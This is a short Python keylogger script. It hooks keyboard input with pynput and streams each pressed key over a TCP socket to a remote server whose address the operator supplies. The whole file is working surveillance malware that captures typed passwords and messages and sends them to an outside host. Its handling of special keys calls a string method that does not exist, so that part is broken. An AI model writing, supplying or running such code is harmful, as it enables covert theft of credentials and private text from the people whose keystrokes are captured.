from pynput import keyboard
from pathlib import Path
import socket

port = 12345
address = "" #put the address of the server here

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect( (address, port) )

def on_key_press(key):
    try:
        if key == keyboard.Key.esc:
            s.send(bytes("\nExiting keylogger...\n", "utf-8"))  # Print the key pressed
            return False  # Stop listener
        else:
            s.send(bytes(key.char, "utf-8"))  # Print the key pressed
            s.send(bytes(" " , "utf-8"))
    except AttributeError:
        k = str(key)
        k.remove ("Key.")
        s.send(bytes(k, "utf-8"))  # Print special keys
        s.send(bytes(" ", "utf-8"))
        
# Collect events until released
with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()  # Wait for the listener to finish
